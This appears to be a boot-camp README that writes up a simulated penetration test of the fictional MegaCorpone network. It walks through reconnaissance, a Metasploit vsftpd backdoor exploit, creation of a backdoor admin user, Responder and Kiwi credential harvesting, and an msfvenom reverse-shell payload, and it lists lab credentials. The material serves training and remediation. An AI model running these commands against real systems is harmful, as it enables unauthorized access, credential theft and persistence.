# Challenges 16 &amp; 17: MegaCorpone/Offensive Security 
Access to Penetration Report: <a href="https://docs.google.com/document/d/1Yl3H_Jfuvs6dhNGDz9ni1OaUGltc31MOrMUnuSMri08/edit?usp=sharing"> MegaCorpOne Penetration Test Report

## Objective Summary
This project highlights offensive security techniques practiced during the University of California, Irvine's Cybersecurity Boot Camp. It involved simulating penetration testing on the fictional MegaCorpone Corporation to uncover and exploit vulnerabilities within their Linux servers and Windows servers. The objective was to identify potential security weaknesses and demonstrate real-world offensive security methodologies.
 
## Project Highlights
Key Achievements:
- Conducted vulnerability assessments and penetration tests on MegaCorpone’s network.
- Exploited misconfigurations and weaknesses in Linux and Windows server environments.
- Delivered actionable security insights and recommendations based on findings.

### Technical Skills Gained
- Server Security:
   - Conducted vulnerability scans and exploited misconfigurations on Linux and Windows servers.
   - Practiced privilege escalation to simulate full system compromise.
- Penetration Testing Methodology:
   - Followed the 5-phase penetration testing process: Reconnaissance, Scanning, Exploitation, Persistence, and Privilege Escalation.
   - Used the MITRE ATT&CK Framework to guide structured attack simulations.
- OSINT & Reconnaissance:
   - Leveraged OSINT tools like OSINT Framework, Google Dorking, and GitHub for information gathering.


### Tools & Environments Used
| Category                                      | Tools Used       |
|-----------------------------------------------|----------------------------|
| <b>Penetration Testing Tools</b>       | Metasploit, Searchsploit, MsVenom |
| <b>Vulnerability Scanning</b>  |  Nmap, Zenmap, Nessus | 
| <b>OSINT Tools</b> | OSINT Framework, Google, GitHub, Shodan.io | 
| <b>Virtual Environments</b> |  Kali Linux, Windows 10, Hyper-V Manager, Azure Windows VMs | 
| <b>Methodologies</b>  | MITRE ATT&CK Framework |


## Project Write up
### Scenario Overview
MegaCorpone, a fictional company, engaged penetration testers (CTP, LLC) to evaluate the security of its web application, Linux, and Windows servers. As they prepared for launch, the goal was to identify and remediate vulnerabilities to ensure a secure deployment.

### Summary of Project Steps

1. <b>Reconnaissance</b>

Gathered publicly available information using Google Dorking and OSINT tools to uncover:
- Website asset files
- Employee usernames and emails
- Sensitve company data
- Server details with open ports (22, 80, 443)

Google Dorking Example:
google: site:megacorpone.com intext:email OR filetype:pdf OR filetype:doc
____________________
2. <b>Scanning & Enumeration</b>

Performed Nmap/Zenmap scans to discover network assests and vulnerabilities:
- Detected open ports (22, 80, 443) and the server OS (Apache/2.4.62 on Debian) on Linux server.
- Identified two additional Windows machines and their open ports.

 Nmap Scan Command Example:
- nmap -sV 172.22.117.150 (service version scan)
____________________
3. <b>Exploitation of Linux Server</b>
- Used MSFconsole to exploit vsftp 2.3.4 service on port 21 to gain access.
- Extracted stored credentials from system text files.
- Used credentials to SSH into the server for further exploitation.

MSFconsole Exploit Example:
- msfconsole -q
- use exploit/unix/ftp/vsftpd_234_backdoor
- set RHOSTS 172.22.117.150
- exploit

 SSH into Linux Server:
- ssh msfadmin@172.22.117.150

Credentials Discovered:
| Username     | Password |
| ------------- | -------- |
| msfadmin | cybersecurity |
| tstark   | Password! | 
____________________
4. <b>Persistence & Credential Harvesting</b>
- Created a persistent backdoor user account to maintain system access.
- Used MSFconsole and LLMNR protocol to capture additional credentials from the Windows 10 machine.
- Exploited Windows DC machine using MSFvenom and Kiwi tools to extract further login credentials.

 Creating a New User for Persistence Example:
- sudo adduser systemmd:password
- sudo usermod -aG admin systemd
- ssh -p 10022 systemd@172.22.117.150

 Kiwi Tools Example:
- kiwi_cmd lsadump::cache
  
 Capturing Windows Credentials Example:
- sudo responder -I eth1 -v

____________________
5. <b>Lateral Movement & Privilege Escalation</b>
- Used admin credentials to move laterally from Windows 10 to the Domain Controller (WinDC01).
- Deployed MSFvenom payloads to escalate privileges and compromise additional systems.

MSFvenom Payload:
- msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.22.117.20 LPORT=4444 -f exe > shell.exe

____________________
### Conclusion

CTP, LLC’s penetration test successfully uncovered critical security vulnerabilities in Megacorpone’s infrastructure. The test demonstrated how weak passwords, exposed usernames, unprotected ports, and vulnerable services could be exploited to gain unauthorized access. Addressing these security gaps is imperative to prevent potential cyber threats, data breaches, and ransomware attacks.

#### Key Takeaways:
- <b>Strengthen Password Policies:</b> Enforce multi-factor authentication and strong password requirements.
- <b>Update or Disable Daemon Services:</b> Regularly update or disable unnecessary services to reduce attack surfaces.
- <b>Secure Open Ports:</b> Restrict unnecessary services and implement firewall rules.
- <b>Monitor for Unauthorized Access:</b> Deploy intrusion detection systems (IDS) to detect suspicious activity.







